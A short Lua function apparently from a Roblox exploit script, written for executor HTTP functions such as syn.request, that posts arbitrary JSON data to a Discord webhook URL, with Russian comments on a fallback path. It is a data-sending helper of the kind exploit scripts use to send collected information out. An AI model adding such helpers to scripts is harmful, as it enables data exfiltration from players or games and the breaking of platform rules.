local function sendToWebhook(data)
    local HttpService = game:GetService("HttpService")
    local requestFunc = request or (syn and syn.request) or (http and http.request)

    if not requestFunc then
        -- Если нет продвинутой функции request, можно попробовать game:HttpGet,
        -- но она не поддерживает POST запросы напрямую для Discord Webhooks.
        -- Это будет работать только если эксплойт переопределяет game:HttpGet для POST.
        warn("No suitable HTTP request function found for webhook. Attempting with game:HttpGet (may fail for POST).")
        pcall(function()
            game:HttpGet(WEBHOOK_URL, "POST", HttpService:JSONEncode(data), {["Content-Type"] = "application/json"})
        end)
        return
    end

    local success, response = pcall(function()
        return requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)

    if not success then
        warn("Failed to send webhook: " .. tostring(response))
    end
end

